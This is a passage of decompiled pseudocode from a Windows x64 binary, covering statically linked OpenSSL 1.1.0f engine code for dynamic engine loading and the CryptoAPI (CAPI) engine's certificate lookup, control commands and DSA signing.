    v24 = v40;
    *(_OWORD *)(a1 + 48) = v23;
    v25 = v41;
    *(_OWORD *)(a1 + 64) = v24;
    v26 = v42;
    *(_OWORD *)(a1 + 80) = v25;
    v27 = v43;
    *(_OWORD *)(a1 + 96) = v26;
    v28 = v44;
    *(_OWORD *)(a1 + 112) = v27;
    v29 = v45;
    *(_OWORD *)(a1 + 128) = v28;
    v30 = v46;
    *(_OWORD *)(a1 + 144) = v29;
    v31 = v47;
    result = 0i64;
    *(_OWORD *)(a1 + 160) = v30;
    *(_OWORD *)(a1 + 176) = v31;
    return result;
  }
  if ( *(int *)(a2 + 48) > 0 && !(unsigned int)sub_140040DC0((_QWORD *)a1) )
  {
    if ( *(int *)(a2 + 48) > 1 )
    {
      sub_140024610(38, 182, 103, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_dyn.c", 502);
      return 0i64;
    }
    sub_140023B90();
  }
  return 1i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140030C70) ----------------------------------------------------
__int64 __fastcall sub_140030C70(__int64 a1, __int64 *a2)
{
  int v2; // eax
  void *v5; // rbx
  unsigned int v6; // edi
  _QWORD *v8; // rax
  __int64 v9; // rax

  v5 = sub_14001DC20((unsigned int)(v2 + 40));
  v6 = 1;
  if ( v5 )
  {
    v8 = sub_1400296C0();
    *((_QWORD *)v5 + 10) = v8;
    if ( v8 )
    {
      *((_DWORD *)v5 + 18) = 1;
      *((_QWORD *)v5 + 7) = "v_check";
      *((_QWORD *)v5 + 8) = "bind_engine";
      sub_140025D20((_DWORD *)qword_140147E80);
      v9 = sub_140034A50(a1, dword_140135178);
      *a2 = v9;
      if ( !v9 )
      {
        v6 = sub_140034B70(a1, dword_140135178, (__int64)v5);
        if ( v6 )
        {
          *a2 = (__int64)v5;
          v5 = 0i64;
        }
      }
      sub_140025CE0((_DWORD *)qword_140147E80);
      if ( v5 )
        sub_1400294B0(*((void ***)v5 + 10));
      sub_14001D930(v5);
      return v6;
    }
    else
    {
      sub_140024610(38, 183, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_dyn.c", 165);
      sub_14001D930(v5);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(38, 183, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_dyn.c", 160);
    return 0i64;
  }
}
// 140030C9E: variable 'v2' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140135178: using guessed type int dword_140135178;
// 140147E80: using guessed type __int64 qword_140147E80;

//----- (0000000140030DD0) ----------------------------------------------------
__int64 sub_140030DD0()
{
  _QWORD *v0; // rax
  __int64 v1; // rbx

  v0 = sub_140034A80();
  v1 = (__int64)v0;
  if ( v0 )
  {
    if ( (unsigned int)sub_140034BB0(v0, (__int64)off_140135168[0])
      && (unsigned int)sub_140034C10(v1, (__int64)off_140135170)
      && (unsigned int)sub_140034C00(v1, (__int64)UserMathErrorFunction)
      && (unsigned int)sub_140034B90(v1, (__int64)UserMathErrorFunction)
      && (unsigned int)sub_140034B50(v1, (__int64)sub_1400304D0)
      && (unsigned int)sub_140034BA0(v1, 4)
      && (unsigned int)sub_140034B40(v1, (__int64)&unk_1400F3C50) )
    {
      return v1;
    }
    sub_1400349C0(v1);
  }
  return 0i64;
}
// 140135168: using guessed type char *off_140135168[2];
// 140135170: using guessed type char *off_140135170;

//----- (0000000140030E90) ----------------------------------------------------
void sub_140030E90()
{
  _QWORD *v0; // rax
  __int64 v1; // rbx

  v0 = (_QWORD *)sub_140030DD0();
  v1 = (__int64)v0;
  if ( v0 )
  {
    sub_140040DC0(v0);
    sub_1400349C0(v1);
    sub_140023B90();
  }
}

//----- (0000000140030ED0) ----------------------------------------------------
void __fastcall sub_140030ED0(void *a1)
{
  sub_14001D930(a1);
}

//----- (0000000140030F00) ----------------------------------------------------
__int64 __fastcall sub_140030F00(__int64 *a1)
{
  int v3; // ebp
  int v4; // edi
  __int64 v5; // rax
  _BYTE *v6; // rax
  void *v7; // rsi

  if ( *((_DWORD *)a1 + 18) != 2 && sub_140035410((_QWORD *)*a1, (_BYTE *)a1[3], 0i64, 0) )
    return 1i64;
  if ( !*((_DWORD *)a1 + 18) )
    return 0i64;
  v3 = sub_1400296E0((unsigned int *)a1[10]);
  if ( v3 < 1 )
    return 0i64;
  v4 = 0;
  while ( 1 )
  {
    v5 = sub_140029880(a1[10], v4);
    v6 = (_BYTE *)sub_140035540(*a1, a1[3], v5);
    v7 = v6;
    if ( !v6 )
      return 0i64;
    if ( sub_140035410((_QWORD *)*a1, v6, 0i64, 0) )
      break;
    sub_14001D930(v7);
    if ( ++v4 >= v3 )
      return 0i64;
  }
  sub_14001D930(v7);
  return 1i64;
}
// 140030F6B: conditional instruction was optimized away because eax.4>=1

//----- (0000000140031000) ----------------------------------------------------
void sub_140031000(__int64 a1, char *a2, ...)
{
  int v2; // eax
  va_list va; // [rsp+40h] [rbp+18h] BYREF

  va_start(va, a2);
  sub_1400345F0(a1, v2 - 38, a2, (int *)va);
}
// 140031024: variable 'v2' is possibly undefined

//----- (0000000140031040) ----------------------------------------------------
__int64 __fastcall sub_140031040(_QWORD *a1)
{
  int v2; // eax

  qword_140142C10 = (__int64)sub_14005E710("CryptoAPI RSA method", 0);
  if ( !qword_140142C10 )
    return 0i64;
  qword_140142C18 = (__int64)sub_14005EC80("CryptoAPI DSA method", 0);
  if ( !qword_140142C18
    || !(unsigned int)sub_140034BB0(a1, (__int64)off_1401354D8[0])
    || !(unsigned int)sub_140034C10((__int64)a1, (__int64)off_1401354E0)
    || !(unsigned int)sub_140034BA0((__int64)a1, 8)
    || !(unsigned int)sub_140034C00((__int64)a1, (__int64)sub_140033120)
    || !(unsigned int)sub_140034B90((__int64)a1, (__int64)sub_140032590)
    || !(unsigned int)sub_140034B60((__int64)a1, (__int64)sub_140031AF0)
    || !(unsigned int)sub_140025390((__int64)a1, qword_140142C10)
    || !(unsigned int)sub_1400253C0((__int64)a1, qword_140142C18)
    || !(unsigned int)sub_14005DAB0((__int64)a1, (__int64)sub_140033B40)
    || !(unsigned int)sub_14005DAC0((__int64)a1, (__int64)sub_140033BF0)
    || !(unsigned int)sub_140034B40((__int64)a1, (__int64)&unk_1400F3F90)
    || !(unsigned int)sub_140034B50((__int64)a1, (__int64)sub_140031400) )
  {
    sub_14005E6C0((void **)qword_140142C10);
    qword_140142C10 = 0i64;
    sub_14005EC30((void **)qword_140142C18);
    qword_140142C18 = 0i64;
    return 0i64;
  }
  v2 = dword_140142C24;
  if ( !dword_140142C24 )
  {
    v2 = sub_140024020();
    dword_140142C24 = v2;
  }
  if ( dword_1401354D0 )
  {
    dword_1401354D0 = 0;
    sub_140024410(v2, dword_140135190);
    sub_140024410(dword_140142C24, dword_1401352E0);
  }
  return 1i64;
}
// 140135190: using guessed type _DWORD dword_140135190[2];
// 1401352E0: using guessed type _DWORD dword_1401352E0[2];
// 1401354D0: using guessed type int dword_1401354D0;
// 1401354D8: using guessed type char *off_1401354D8[2];
// 1401354E0: using guessed type char *off_1401354E0;
// 140142C10: using guessed type __int64 qword_140142C10;
// 140142C18: using guessed type __int64 qword_140142C18;
// 140142C24: using guessed type int dword_140142C24;

//----- (0000000140031220) ----------------------------------------------------
void __fastcall sub_140031220(unsigned int a1)
{
  char v1[16]; // [rsp+20h] [rbp-28h] BYREF

  sub_14002A5C0(v1, 0xAui64, "%lX", a1);
  sub_140023A40(2, "Error code= 0x", v1);
}

//----- (0000000140031280) ----------------------------------------------------
void sub_140031280()
{
  DWORD LastError; // eax
  char v1[16]; // [rsp+20h] [rbp-28h] BYREF

  LastError = GetLastError();
  sub_14002A5C0(v1, 0xAui64, "%lX", LastError);
  sub_140023A40(2, "Error code= 0x", v1);
}

//----- (00000001400312F0) ----------------------------------------------------
CHAR *__fastcall sub_1400312F0(__int64 a1, const CERT_CONTEXT *a2)
{
  WCHAR *v4; // rax
  WCHAR *v5; // rdi
  CHAR *v6; // rbx
  int v7; // eax
  DWORD pcbData; // [rsp+50h] [rbp+18h] BYREF

  sub_140031000(a1, "capi_cert_get_fname\n");
  if ( !CertGetCertificateContextProperty(a2, 0xBu, 0i64, &pcbData) )
    return 0i64;
  v4 = (WCHAR *)sub_14001D8E0(pcbData);
  v5 = v4;
  if ( v4 )
  {
    if ( CertGetCertificateContextProperty(a2, 0xBu, v4, &pcbData) )
    {
      v6 = sub_140034820(v5);
      sub_14001D930(v5);
      return v6;
    }
    v7 = dword_140142C24;
    if ( !dword_140142C24 )
    {
      v7 = sub_140024020();
      dword_140142C24 = v7;
    }
    sub_140024610(v7, 99, 108, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1327);
    sub_140031280();
    sub_14001D930(v5);
  }
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142C24: using guessed type int dword_140142C24;

//----- (0000000140031400) ----------------------------------------------------
__int64 __fastcall sub_140031400(__int64 a1, int a2, DWORD a3, _BYTE *a4)
{
  int v4; // eax
  unsigned int v6; // esi
  int v9; // eax
  __int64 result; // rax
  __int64 v11; // rdi
  FILE *v12; // rax
  __int64 *v13; // rbp
  int v14; // eax
  void *v15; // rbx
  int v16; // eax
  int v17; // eax
  unsigned int v18; // eax
  const char *v19; // rax
  int v20; // eax
  int v21; // eax
  int v22; // eax
  DWORD v23; // [rsp+30h] [rbp-28h] BYREF
  char *v24; // [rsp+38h] [rbp-20h] BYREF

  v6 = v4 - 63;
  if ( dword_140135180 == -1 )
  {
    v9 = dword_140142C24;
    if ( !dword_140142C24 )
    {
      v9 = sub_140024020();
      dword_140142C24 = v9;
    }
    sub_140024610(v9, 100, 106, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 290);
    return 0i64;
  }
  else
  {
    v11 = sub_140034A50(a1, dword_140135180);
    v12 = _acrt_iob_func(v6);
    v13 = sub_14003E580((__int64)v12, 0);
    if ( v13 )
    {
      switch ( a2 )
      {
        case 200:
          v6 = (unsigned int)sub_140033400(v11, (__int64)v13, 0i64);
          goto LABEL_44;
        case 201:
          v6 = (unsigned int)sub_140033400(v11, (__int64)v13, a4);
          goto LABEL_44;
        case 202:
          *(_DWORD *)v11 = a3;
          sub_140031000(v11, "Setting debug level to %d\n", a3);
          goto LABEL_44;
        case 203:
          v19 = (const char *)sub_14003BB60(a4);
          if ( v19 )
          {
            *(_QWORD *)(v11 + 8) = v19;
            sub_140031000(v11, "Setting debug file to %s\n", v19);
            goto LABEL_44;
          }
          v20 = dword_140142C24;
          if ( !dword_140142C24 )
          {
            v20 = sub_140024020();
            dword_140142C24 = v20;
          }
          sub_140024610(v20, 100, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 350);
          goto LABEL_43;
        case 204:
          *(_DWORD *)(v11 + 16) = a3;
          sub_140031000(v11, "Setting key type to %d\n", a3);
          goto LABEL_44;
        case 205:
          v6 = sub_1400338A0(v11, (__int64)v13);
          goto LABEL_44;
        case 206:
          if ( (unsigned int)sub_140032F20(v11, (const char **)&v24, &v23, a3) != v6 )
            goto LABEL_43;
          v6 = sub_140031920(v11, v24, v23, 0);
          sub_14001D930(v24);
          goto LABEL_44;
        case 207:
          v6 = sub_140031920(v11, a4, *(_DWORD *)(v11 + 32), v6);
          goto LABEL_44;
        case 208:
          *(_DWORD *)(v11 + 32) = a3;
          goto LABEL_44;
        case 209:
          v6 = sub_140033520(v11, (__int64)v13);
          goto LABEL_44;
        case 210:
          *(_DWORD *)(v11 + 64) = a3;
          goto LABEL_44;
        case 211:
          if ( a3 - 1 > 2 )
          {
            v21 = dword_140142C24;
            if ( !dword_140142C24 )
            {
              v21 = sub_140024020();
              dword_140142C24 = v21;
            }
            sub_140024610(v21, 100, 114, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 370);
            sub_140029BA0((__int64)v13);
            result = 0i64;
          }
          else
          {
            *(_DWORD *)(v11 + 60) = a3;
LABEL_44:
            sub_140029BA0((__int64)v13);
            result = v6;
          }
          break;
        case 212:
          v15 = sub_14003BB60(a4);
          if ( v15 )
          {
            sub_14001D930(*(void **)(v11 + 40));
            *(_QWORD *)(v11 + 40) = v15;
            sub_140031000(v11, "Setting store name to %s\n", a4);
          }
          else
          {
            v16 = dword_140142C24;
            if ( !dword_140142C24 )
            {
              v16 = sub_140024020();
              dword_140142C24 = v16;
            }
            sub_140024610(v16, 100, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 323);
LABEL_43:
            v6 = 0;
          }
          goto LABEL_44;
        case 213:
          v17 = *(_DWORD *)(v11 + 56);
          if ( ((unsigned __int8)a3 & (unsigned __int8)v6) != 0 )
            v18 = v17 & 0xFFFCFFFF | 0x20000;
          else
            v18 = v17 & 0xFFFCFFFF | 0x10000;
          *(_DWORD *)(v11 + 56) = v18;
          sub_140031000(v11, "Setting flags to %d\n", a3);
          goto LABEL_44;
        default:
          v22 = dword_140142C24;
          if ( !dword_140142C24 )
          {
            v22 = sub_140024020();
            dword_140142C24 = v22;
          }
          sub_140024610(v22, 100, 118, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 386);
          goto LABEL_43;
      }
    }
    else
    {
      v14 = dword_140142C24;
      if ( !dword_140142C24 )
      {
        v14 = sub_140024020();
        dword_140142C24 = v14;
      }
      sub_140024610(v14, 100, 128, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 296);
      return 0i64;
    }
  }
  return result;
}
// 14003141A: variable 'v4' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140135180: using guessed type int dword_140135180;
// 140142C24: using guessed type int dword_140142C24;

//----- (00000001400317E0) ----------------------------------------------------
void __fastcall sub_1400317E0(void **a1)
{
  sub_140031000((__int64)a1, "Calling capi_ctx_free with %lx\n", a1);
  if ( a1 )
  {
    sub_14001D930(a1[3]);
    sub_14001D930(a1[1]);
    sub_14001D930(a1[5]);
    sub_14001D930(a1[6]);
    sub_14001D930(a1);
  }
}

//----- (0000000140031880) ----------------------------------------------------
_DWORD *__fastcall sub_140031880()
{
  int v0; // eax
  _DWORD *result; // rax
  int v2; // eax

  result = sub_14001DC20((unsigned int)(v0 + 40));
  if ( result )
  {
    result[8] = 1;
    *((_QWORD *)result + 9) = UserMathErrorFunction;
    result[16] = 3;
    result[4] = 1;
    result[14] = 114688;
    result[15] = 1;
  }
  else
  {
    v2 = dword_140142C24;
    if ( !dword_140142C24 )
    {
      v2 = sub_140024020();
      dword_140142C24 = v2;
    }
    sub_140024610(v2, 101, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1588);
    return 0i64;
  }
  return result;
}
// 14003189A: variable 'v0' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142C24: using guessed type int dword_140142C24;

//----- (0000000140031920) ----------------------------------------------------
__int64 __fastcall sub_140031920(__int64 a1, char *a2, DWORD a3, int a4)
{
  unsigned int cchWideChar; // edx
  unsigned __int64 v9; // rcx
  __int64 v10; // rax
  void *v11; // rsp
  void *v12; // rbx
  int v13; // eax
  __int64 result; // rax
  int v15; // eax
  WCHAR WideCharStr[4]; // [rsp+30h] [rbp+0h] BYREF

  sub_140031000(a1, "capi_ctx_set_provname, name=%s, type=%d\n", a2, a3);
  if ( !a4 )
  {
LABEL_8:
    v12 = sub_14003BB60(a2);
    if ( v12 )
    {
      sub_14001D930(*(void **)(a1 + 24));
      result = 1i64;
      *(_QWORD *)(a1 + 24) = v12;
      *(_DWORD *)(a1 + 32) = a3;
    }
    else
    {
      v13 = dword_140142C24;
      if ( !dword_140142C24 )
      {
        v13 = sub_140024020();
        dword_140142C24 = v13;
      }
      sub_140024610(v13, 102, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1639);
      return 0i64;
    }
    return result;
  }
  cchWideChar = MultiByteToWideChar(0, 0, a2, -1, 0i64, 0);
  if ( cchWideChar )
  {
    v9 = 2i64 * cchWideChar;
    v10 = v9 + 15;
    if ( v9 + 15 <= v9 )
      v10 = 0xFFFFFFFFFFFFFF0i64;
    v11 = alloca(v10 & 0xFFFFFFFFFFFFFFF0ui64);
    MultiByteToWideChar(0, 0, a2, -1, WideCharStr, cchWideChar);
    if ( WideCharStr )
    {
      if ( CryptAcquireContextW((HCRYPTPROV *)WideCharStr, 0i64, WideCharStr, a3, 0xF0000000) )
      {
        CryptReleaseContext(*(HCRYPTPROV *)WideCharStr, 0);
        goto LABEL_8;
      }
    }
  }
  v15 = dword_140142C24;
  if ( !dword_140142C24 )
  {
    v15 = sub_140024020();
    dword_140142C24 = v15;
  }
  sub_140024610(v15, 102, 103, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1631);
  sub_140031280();
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142C24: using guessed type int dword_140142C24;

//----- (0000000140031AF0) ----------------------------------------------------
__int64 sub_140031AF0()
{
  sub_14005E6C0((void **)qword_140142C10);
  qword_140142C10 = 0i64;
  sub_14005EC30((void **)qword_140142C18);
  qword_140142C18 = 0i64;
  if ( !dword_1401354D0 )
  {
    sub_140024900(dword_140142C24, dword_140135190);
    sub_140024900(dword_140142C24, dword_1401352E0);
    dword_1401354D0 = 1;
  }
  return 1i64;
}
// 140135190: using guessed type _DWORD dword_140135190[2];
// 1401352E0: using guessed type _DWORD dword_1401352E0[2];
// 1401354D0: using guessed type int dword_1401354D0;
// 140142C10: using guessed type __int64 qword_140142C10;
// 140142C18: using guessed type __int64 qword_140142C18;
// 140142C24: using guessed type int dword_140142C24;

//----- (0000000140031B70) ----------------------------------------------------
__int64 **__fastcall sub_140031B70(const BYTE *a1, int a2, __int64 a3)
{
  __int64 **v6; // rsi
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rbx
  int v11; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  __int64 *v17; // rdi
  __int64 *v18; // rax
  __int64 *v19; // rbx
  BYTE v20; // al
  char v21; // al
  char v22; // al
  char v23; // al
  char v24; // al
  char v25; // al
  char v26; // al
  char v27; // al
  char v28; // al
  char v29; // al
  __int64 **v30; // rax
  DWORD pdwSigLen; // [rsp+30h] [rbp-40h] BYREF
  HCRYPTHASH hHash; // [rsp+38h] [rbp-38h] BYREF
  BYTE pbSignature; // [rsp+40h] [rbp-30h] BYREF
  char v34; // [rsp+41h] [rbp-2Fh]
  char v35; // [rsp+42h] [rbp-2Eh]
  char v36; // [rsp+43h] [rbp-2Dh]
  char v37; // [rsp+44h] [rbp-2Ch]
  char v38; // [rsp+45h] [rbp-2Bh]
  char v39; // [rsp+46h] [rbp-2Ah]
  char v40; // [rsp+47h] [rbp-29h]
  char v41; // [rsp+48h] [rbp-28h]
  char v42; // [rsp+49h] [rbp-27h]
  char v43; // [rsp+4Ah] [rbp-26h]
  char v44; // [rsp+4Bh] [rbp-25h]
  char v45; // [rsp+4Ch] [rbp-24h]
  char v46; // [rsp+4Dh] [rbp-23h]
  char v47; // [rsp+4Eh] [rbp-22h]
  char v48; // [rsp+4Fh] [rbp-21h]
  char v49; // [rsp+50h] [rbp-20h]
  char v50; // [rsp+51h] [rbp-1Fh]
  char v51; // [rsp+52h] [rbp-1Eh]
  BYTE v52; // [rsp+53h] [rbp-1Dh]
  char v53[20]; // [rsp+54h] [rbp-1Ch] BYREF

  v6 = 0i64;
  v7 = sub_14002DA00(a3);
  v8 = sub_140034A50(v7, dword_140135180);
  sub_140031000(v8, "Called CAPI_dsa_do_sign()\n");
  v9 = sub_14002DA40(a3, dword_140135188);
  v10 = v9;
  if ( v9 )
  {
    if ( a2 == 20 )
    {
      if ( CryptCreateHash(*(_QWORD *)(v9 + 8), 0x8004u, 0i64, 0, &hHash) )
      {
        if ( CryptSetHashParam(hHash, 2u, a1, 0) )
        {
          pdwSigLen = 40;
          if ( CryptSignHashW(hHash, *(_DWORD *)(v10 + 24), 0i64, 0, &pbSignature, &pdwSigLen) )
          {
            v17 = (__int64 *)sub_140027200();
            v18 = (__int64 *)sub_140027200();
            v19 = v18;
            if ( !v17 )
              goto LABEL_27;
            if ( !v18 )
              goto LABEL_27;
            v20 = v52;
            v52 = pbSignature;
            pbSignature = v20;
            v21 = v51;
            v51 = v34;
            v34 = v21;
            v22 = v50;
            v50 = v35;
            v35 = v22;
            v23 = v49;
            v49 = v36;
            v36 = v23;
            v24 = v48;
            v48 = v37;
            v37 = v24;
            v25 = v47;
            v47 = v38;
            v38 = v25;
            v26 = v46;
            v46 = v39;
            v39 = v26;
            v27 = v45;
            v45 = v40;
            v40 = v27;
            v28 = v44;
            v44 = v41;
            v41 = v28;
            v29 = v43;
            v43 = v42;
            v42 = v29;
            if ( !sub_140026840(&pbSignature, 20, (__int64)v17) )
              goto LABEL_27;
            if ( sub_1400347B0((__int64)v19, v53, 20) && (v30 = (__int64 **)sub_14005E8B0(), (v6 = v30) != 0i64) )
            {
              sub_14005E910(v30, v17, v19);
            }
            else
            {
LABEL_27:
              sub_140026FF0(v17);
              sub_140026FF0(v19);
            }
          }
          else
          {
            v16 = dword_140142C24;
            if ( !dword_140142C24 )
            {
              v16 = sub_140024020();
              dword_140142C24 = v16;
            }
            sub_140024610(v16, 114, 111, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1021);
            sub_140031280();
          }
        }
        else
        {
          v15 = dword_140142C24;
          if ( !dword_140142C24 )
          {
            v15 = sub_140024020();
            dword_140142C24 = v15;
          }
          sub_140024610(v15, 114, 102, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1013);
          sub_140031280();
        }
        sub_140023440((__int64)&pbSignature, 40i64);
        CryptDestroyHash(hHash);
        return v6;
      }
      else
      {
        v14 = dword_140142C24;
        if ( !dword_140142C24 )
        {
          v14 = sub_140024020();
          dword_140142C24 = v14;
        }
        sub_140024610(v14, 114, 99, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1006);
        sub_140031280();
        return 0i64;
      }
    }
    else
    {
      v13 = dword_140142C24;
      if ( !dword_140142C24 )
      {
        v13 = sub_140024020();
        dword_140142C24 = v13;
      }
      sub_140024610(v13, 114, 124, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1000);
      return 0i64;
    }
  }
  else
  {
    v11 = dword_140142C24;
    if ( !dword_140142C24 )
    {
      v11 = sub_140024020();
      dword_140142C24 = v11;
    }
    sub_140024610(v11, 114, 101, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 995);
    return 0i64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140135180: using guessed type int dword_140135180;
// 140135188: using guessed type int dword_140135188;
// 140142C24: using guessed type int dword_140142C24;
// 140031B70: using guessed type char var_1C[20];

//----- (0000000140031ED0) ----------------------------------------------------
__int64 __fastcall sub_140031ED0(__int64 a1)
{
  __int64 v2; // rax
  __int64 v3; // rbx

  v2 = sub_14002DA40(a1, dword_140135188);
  v3 = v2;
  if ( v2 )
  {
    CryptDestroyKey(*(_QWORD *)(v2 + 16));
    CryptReleaseContext(*(_QWORD *)(v3 + 8), 0);
    if ( *(_QWORD *)v3 )
      CertFreeCertificateContext(*(PCCERT_CONTEXT *)v3);
    sub_14001D930((void *)v3);
  }
  sub_14002DD20(a1, dword_140135188, 0i64);
  return 1i64;
}
// 140135188: using guessed type int dword_140135188;

//----- (0000000140031F60) ----------------------------------------------------
void __fastcall sub_140031F60(__int64 a1, __int64 a2, const CERT_CONTEXT *a3)
{
  int v3; // esi
  CHAR *v7; // rax
  CHAR *v8; // rbp
  __int64 cbCertEncoded; // r8
  int **v10; // rbp
  unsigned int **v11; // rax
  unsigned int **v12; // rax
  void *v13; // rbx
  BYTE *pbCertEncoded; // [rsp+40h] [rbp+8h] BYREF

  v3 = *(_DWORD *)(a1 + 64);
  if ( (v3 & 2) != 0 )
  {
    v7 = sub_1400312F0(a1, a3);
    v8 = v7;
    if ( v7 )
    {
      sub_14002A590(a2, "  Friendly Name \"%s\"\n", v7);
      sub_14001D930(v8);
    }
    else
    {
      sub_14002A590(a2, "  <No Friendly Name>\n");
    }
  }
  cbCertEncoded = a3->cbCertEncoded;
  pbCertEncoded = a3->pbCertEncoded;
  v10 = (int **)sub_14005EEF0(0i64, (char **)&pbCertEncoded, cbCertEncoded);
  if ( !v10 )
    sub_14002A590(a2, "  <Can't parse certificate>\n");
  if ( (v3 & 1) != 0 )
  {
    sub_14002A590(a2, "  Subject: ");
    v11 = (unsigned int **)sub_14005F000((__int64)v10);
    sub_14005F0A0(a2, v11, 0, 8520479);
    sub_14002A590(a2, "\n  Issuer: ");
    v12 = (unsigned int **)__crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(v10);
    sub_14005F0A0(a2, v12, 0, 8520479);
    sub_14002A590(a2, "\n");
  }
  if ( (v3 & 4) != 0 )
    sub_14005FF60(a2, v10, 8520479, 0);
  if ( (v3 & 0x20) != 0 )
  {
    v13 = sub_140032E00(a1, a3);
    sub_1400320F0(a1, a2, (__int64)v13);
    sub_14001D930(v13);
  }
  if ( (v3 & 8) != 0 )
    sub_140060720(a2, (__int64)v10);
  sub_14005EE60((unsigned int *)v10);
}
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (00000001400320F0) ----------------------------------------------------
void __fastcall sub_1400320F0(__int64 a1, __int64 a2, __int64 a3)
{
  CHAR *v5; // rbp
  CHAR *v6; // rax
  char *v7; // rsi

  if ( a3 )
  {
    v5 = sub_140034820(*(const WCHAR **)(a3 + 8));
    v6 = sub_140034820(*(const WCHAR **)a3);
    v7 = v6;
    if ( v5 )
    {
      if ( v6 )
      {
        sub_14002A590(a2, "  Private Key Info:\n");
        sub_14002A590(a2, "    Provider Name:  %s, Provider Type %lu\n", v5, *(unsigned int *)(a3 + 16));
        sub_14002A590(a2, "    Container Name: %s, Key Type %lu\n", v7, *(unsigned int *)(a3 + 40));
      }
    }
    sub_14001D930(v5);
    sub_14001D930(v7);
  }
  else
  {
    sub_14002A590(a2, "  No Private Key\n");
  }
}

//----- (00000001400321D0) ----------------------------------------------------
PCCERT_CONTEXT __fastcall sub_1400321D0(__int64 a1, const void *pvFindPara, void *a3)
{
  const CERT_CONTEXT *v7; // rdi
  void *v8; // rax
  void *v9; // rbx
  CHAR *v10; // rsi
  CHAR *v11; // rcx
  int v12; // eax
  int v13; // edx
  BOOL v14; // ebx
  int v15; // eax
  DWORD pcbData; // [rsp+50h] [rbp+8h] BYREF

  if ( *(_DWORD *)(a1 + 60) == 1 )
    return CertFindCertificateInStore(a3, 1u, 0, 0x70007u, pvFindPara, 0i64);
  if ( *(_DWORD *)(a1 + 60) != 2 )
    return 0i64;
  v7 = CertEnumCertificatesInStore(a3, 0i64);
  if ( !v7 )
    return 0i64;
  while ( 1 )
  {
    sub_140031000(a1, "capi_cert_get_fname\n");
    if ( CertGetCertificateContextProperty(v7, 0xBu, 0i64, &pcbData) )
    {
      v8 = sub_14001D8E0(pcbData);
      v9 = v8;
      if ( v8 )
      {
        if ( !CertGetCertificateContextProperty(v7, 0xBu, v8, &pcbData) )
        {
          v15 = dword_140142C24;
          if ( !dword_140142C24 )
          {
            v15 = sub_140024020();
            dword_140142C24 = v15;
          }
          sub_140024610(v15, 99, 108, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1327);
          sub_140031280();
          sub_14001D930(v9);
          goto LABEL_18;
        }
        v10 = sub_140034820((const WCHAR *)v9);
        sub_14001D930(v9);
        if ( v10 )
        {
          v11 = v10;
          do
          {
            v12 = (unsigned __int8)v11[(_BYTE *)pvFindPara - v10];
            v13 = (unsigned __int8)*v11 - v12;
            if ( v13 )
              break;
            ++v11;
          }
          while ( v12 );
          v14 = v13 == 0;
          sub_14001D930(v10);
          if ( v14 )
            return v7;
        }
      }
    }
LABEL_18:
    v7 = CertEnumCertificatesInStore(a3, v7);
    if ( !v7 )
      return 0i64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142C24: using guessed type int dword_140142C24;

//----- (00000001400323D0) ----------------------------------------------------
HCRYPTPROV *__fastcall sub_1400323D0(__int64 a1, const void *a2)
{
  int v2; // eax
  HCRYPTPROV *v3; // rdi
  unsigned int cchWideChar; // edx
  unsigned __int64 v7; // rax
  __int64 v8; // rcx
  signed __int64 v9; // rcx
  void *v10; // rsp
  void *v11; // rsp
  unsigned int v12; // edx
  unsigned __int64 v13; // rax
  __int64 v14; // rcx
  signed __int64 v15; // rcx
  void *v16; // rsp
  void *v17; // rsp
  HCRYPTPROV *result; // rax
  HCRYPTPROV *v19; // rsi
  const CERT_CONTEXT *v20; // rax
  const CERT_CONTEXT *v21; // r14
  WCHAR WideCharStr[4]; // [rsp+30h] [rbp+0h] BYREF

  v2 = *(_DWORD *)(a1 + 60);
  v3 = 0i64;
  if ( v2 > 0 )
  {
    if ( v2 <= 2 )
    {
      result = (HCRYPTPROV *)sub_140033EC0(a1, 0i64);
